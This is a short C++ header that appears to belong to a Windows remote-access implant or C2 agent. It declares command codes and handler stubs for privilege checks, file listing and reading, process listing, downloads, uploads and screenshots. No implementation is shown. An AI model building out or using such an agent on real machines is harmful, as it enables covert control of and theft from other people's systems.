#include "common.hpp"



enum CmdCodes {
	padding,
	CMD_CODE_GETPRIVS,
	CMD_CODE_LS,
	CMD_CODE_CD,
	CMD_CODE_CAT,
	CMD_CODE_MV,
	CMD_CODE_CP,
	CMD_CODE_DOWNLOAD,
	CMD_CODE_T,
	CMD_CODE_PS,
	CMD_CODE_RECONFIG,
	CMD_CODE_START,
	CMD_CODE_UPLOAD,
	CMD_CODE_SCREENSHOT,
	CMD_CODE_GETDISKS,

};

class Commands {
private:
	PCHAR HeapBuffer         = NULL;
	SIZE_T appendBufferCurrentSize = 0;
	SIZE_T appendBufferUsedSize = 0;
	CHAR tempBuffer[1024];
	void AppendToBuffer(PCHAR TempBuffer, PCHAR* HeapBuffer, SIZE_T StringSize, BOOL Final);

	

public:
	void Dispatch(PBYTE Data, INT Size);
	//void Dispatch            (INT code, PCHAR commandID, PCHAR Param, PCHAR Param2);
	void cmd_getprivs        (PCHAR commandID);
	void cmd_changedir       (PCHAR CommandID, PCHAR param);
	void cmd_ls              (PCHAR CommandID, PCHAR Param);
	void cmd_cp              (UINT CommandID, PBYTE Data);
	void cmd_mv              (PCHAR CommandID, PCHAR src, PCHAR dest);
	void cmd_cat             (PCHAR commandId, PCHAR fileName);
	void cmd_ps              (PCHAR commandId, PCHAR args);
};
